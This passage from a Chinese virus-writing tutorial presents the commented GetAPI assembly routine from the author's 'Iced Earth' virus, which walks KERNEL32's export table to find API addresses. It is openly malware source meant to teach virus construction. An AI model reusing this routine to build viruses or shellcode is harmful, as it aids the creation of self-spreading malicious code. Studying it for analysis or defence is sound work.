
这些表还有更多的入口，但是有那些就足够了...

我希望你已经理解了我解释的东西。我试图尽可能的使它表述简单，如果你不能理解它，不要往下看了，一步一步地重读它。要有耐心。我肯定你会懂地。嗯，现在你可能需要一些代码了。下面给出我例程，作为一个示例，在我的 `Iced Earth` 病毒中用到了。

#### `GetAPI` & `GetAPIs` 过程

这是我的寻找所有需要的 API 的函数... 它们被分成了两部分。`GetAPI` 函数仅仅获得了我们需要的一个函数, 而 `GetAPIs` 函数则搜索病毒所需要的所有 API 函数。

```asm
GetAPI proc
;--------------------------------------------------------------------------
; 让我们来看看，这个函数需要和返回的参数如下：
;
; 输入：   ESI : 指向 API 名字的指针 (区分大小写)
; 输出：   EAX : API 地址
;--------------------------------------------------------------------------
    mov     edx,esi                 ; Save ptr to name
@_1:  cmp     byte ptr [esi],0        ; Null-terminated char?
    jz      @_2                     ; Yeah, we got it.
    inc     esi                     ; Nopes, continue searching
    jmp     @_1                     ; bloooopz...
@_2:  inc     esi                     ; heh, don't forget this ;)
    sub     esi,edx                 ; ESI = API Name size
    mov     ecx,esi                 ; ECX = ESI :)
;--------------------------------------------------------------------------
; 好了，我亲爱的朋友们，这很容易理解。我们在 ESI 中是指向 API 名字开始
; 的指针，让我们想象一下，我们想要寻找"FindFirstFileA":
;
; FFFA         db   "FindFirstFileA",0
;               ↑ 指针指向这儿
;
; 而且我们需要保存这个指针，并知道了 API 名的大小，所以
; 我们把指向 API 名字的初始指针保存到一个我们不用的寄存器中如 EDX
; 然后增加在 ESI 中的指针的值，直到[ESI]=0
;
; FFFA         db   "FindFirstFileA",0
;                               ↑ 现在指针指向这儿了
;
; 也就是说，以 NULL 结尾:)然后，通过把新指针减去旧指针，我们得
; 到了 API 名字的大小，搜索引擎需要它。然后我把它保存到 ECX 中，
; 也是一个我们不会使用的寄存器。
;---------------------------------------------------------------------------
    xor     eax,eax                 ; EAX = 0
    mov     word ptr [ebp+Counter],ax ; Counter set to 0
    mov     esi,[ebp+kernel]        ; Get kernel's PE head. offset
    add     esi,3Ch
    lodsw                           ; in AX
    add     eax,[ebp+kernel]        ; Normalize it
    mov     esi,[eax+78h]           ; Get Export Table RVA
    add     esi,[ebp+kernel]        ; Ptr to Address Table RVA
    add     esi,1Ch
;---------------------------------------------------------------------------
; 首先，我们清除 EAX，然后为了避免无法预料的错误，使得计数变量为 0。
; 如果你还记得 PE 文件头偏移地址 3CH(从映象基址 MZ 标志开始计数)的作用，
; 你会理解这个的。我们正在请求得到 KERNEL32 PE 头偏移的开始。因为
; 它是一个 RVA，我们把它规范化，那就是我们得到了它的 PE 头偏移地址。
; 现在我们所要做的是获得输出表(Export Table)的地址(在 PE 头+78h 处)，
; 然后，我们避开这个结构的不想要的数据，直接获得地址表(Address Table)
; 的 RVA。
;---------------------------------------------------------------------------
    lodsd                           ; EAX = Address Table RVA
    add     eax,[ebp+kernel]        ; Normalize
    mov     dword ptr [ebp+AddressTableVA],eax ; Store it in VA form
    lodsd                           ; EAX = Name Ptrz Table RVA
    add     eax,[ebp+kernel]        ; Normalize
    push    eax                     ; mov [ebp+NameTableVA],eax
    lodsd                           ; EAX = Ordinal Table RVA
    add     eax,[ebp+kernel]        ; Normalize
    mov     dword ptr [ebp+OrdinalTableVA],eax ; Store in VA form
    pop     esi                     ; ESI = Name Ptrz Table VA
;---------------------------------------------------------------------------
; 如果你还记得，在 ESI 中是指向地址表 RVA(Address Table RVA)的指针，所以，
; 我们为了得到那个地址，用了一个 LODSD，它把由 ESI 所指定的双字(DWORD)保
; 存到 EAX 中。因为它是一个 RVA，我们需要对它规范化。
;
; 让我们看看 Matt Pietrek 关于这个第一个域的描述：
;
; “这个域是一个 RVA 而且指向一个函数地址数组。这个函数地址是这个模块中
; 每一个输出地址的入口点(RVA)。”
;
; 毫无疑问了，我们把它保存到它的变量中了。然后，接下来我们找到的
; 是名字指针表(Name Pointers Table)，Matt Pietrek 的描述如下：
;
; “这个域是一个 RVA，而且指向一个字符串指针数组。这些字符串是模块
; 的输出函数的名字。”
;
; 但是我没有把它保存到一个变量中，我把它压栈，仅仅是因为我很快就要用到
; 它。最终，我们找到了，下面是 Matt Pietrek 关于它的描述：
;
; “这个域是一个 RVA，而且指向一个字(WORD)数组。这些字是这个模块
; 的所有输出函数的序号”。
;
; 好了，那就是我们所做的事情。
;---------------------------------------------------------------------------
@_3:  push    esi                     ; Save ESI for l8r restore
    lodsd                           ; Get value ptr ESI in EAX
    add     eax,[ebp+kernel]        ; Normalize
    mov     esi,eax                 ; ESI = VA of API name
    mov     edi,edx                 ; EDI = ptr to wanted API
    push    ecx                     ; ECX = API size
    cld                             ; Clear direction flag
    rep     cmpsb                   ; Compare both API names
    pop     ecx                     ; Restore ECX
    jz      @_4                     ; Jump if APIs are 100% equal
    pop     esi                     ; Restore ESI
    add     esi,4                   ; And get next value of array
    inc     word ptr [ebp+Counter]   ; Increase counter
    jmp     @_3                     ; Loop again
;---------------------------------------------------------------------------
; 嗨，是不是我放了太多的代码而没有注释？因为我刚做好，但是懂得了这一块代码
; 不能因为解释它而分离开来。我们首先所做的是把 ESI(在 CMPSB 指令执行中将改变)
; 压栈，以备后用。然后，我们获得由 ESI(Name Pointerz Table)指向的双字保存到
; 累加器(EAX)中，所有这些通过 LODSD 指令实现。我们通过加上 kernel 的基址来规范
; 化它。好了，现在我们在 EAX 中是指向某一个 API 名字的指针，但是我们不知道(仍然)
; 是什么 API。例如，EAX 可以指向诸如"CreateProcessA"，而这个 API 对我们的病毒来
; 说不感兴趣...为了把那个字符串和我们想要的字符串(现在由 EDX 指向)，我们有 CMPSB。
; 所以，我们准备它的参数:在 ESI 中，我们使得指针指向现在在 Name Pointerz Table 中
; 的 API 的开始，在 EDI 中，我们使之指向需要的 API)。在 ECX 中我们保存它的大小，
; 然后我们按字节比较。如果所有的字符相等，就设置 0 标志，然后跳转到获取那个 API
; 地址的例程，但是如果它失败了，我们恢复 ESI，并把它加上 DWORD 的大小，为了获取
```
